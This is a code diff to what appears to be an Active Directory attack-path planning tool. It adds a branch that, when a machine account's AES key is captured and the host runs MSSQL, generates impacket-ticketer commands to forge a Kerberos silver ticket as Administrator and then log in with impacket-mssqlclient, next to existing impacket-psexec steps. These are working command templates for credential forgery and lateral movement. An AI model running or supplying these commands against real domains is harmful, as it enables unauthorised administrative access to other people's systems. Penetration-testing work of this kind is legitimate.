@@ -1167,6 +1167,25 @@ def run(report, store, ui=None):
         elif _is_machine:
             _sid_ptk = store.domain_sid() or "<S-1-5-21-...>"
             _host_short = _ptk_user.split("\\")[-1].rstrip("$")
+            # iter-134: mirror iter-133's MSSQLSvc variant for the AES-key
+            # branch. Same store.canon() logic to bridge HOST$ short-name
+            # against nmap-shaped IP host keys.
+            _mssql_hosts_ae = {store.canon(h)
+                               for h in store.hosts_with_service(("mssql",))}
+            _mssql_here_ae = (store.canon(_host_short) in _mssql_hosts_ae
+                              or _host_short.lower() in _mssql_hosts_ae)
+            _extra_ae = []
+            if _mssql_here_ae:
+                _extra_ae = [
+                    f"# {_host_short} runs MSSQL - also forge MSSQL SPN:",
+                    f"impacket-ticketer -aesKey {_ev.hash} "
+                    f"-domain-sid {_sid_ptk} -domain {_ptk_dom} "
+                    f"-spn MSSQLSvc/{_host_short}.{_ptk_dom}:1433 Administrator",
+                    f"export KRB5CCNAME=Administrator.ccache",
+                    f"impacket-mssqlclient -k -no-pass "
+                    f"'{_ptk_dom}/Administrator@{_host_short}.{_ptk_dom}' "
+                    f"-windows-auth",
+                ]
             chains.append(Chain("R-SILVER", "silver ticket via machine AES key",
                 f"machine AES key {_ptk_user} -> silver ticket forgery for {_host_short}",
                 crit=9, conf=0.9, ready=1.4, prox=0.9,       # score 10.2
@@ -1177,6 +1196,7 @@ def run(report, store, ui=None):
                     f"export KRB5CCNAME=Administrator.ccache",
                     f"impacket-psexec -k -no-pass -dc-ip {_ptk_dc} "
                     f"'{_ptk_dom}/Administrator@{_host_short}.{_ptk_dom}'",
+                    *_extra_ae,
                 ], src=_ev.source, line=_ev.line))
         else:
             # Score is between R7 (11ish for domain user hash) and R-GOLDEN
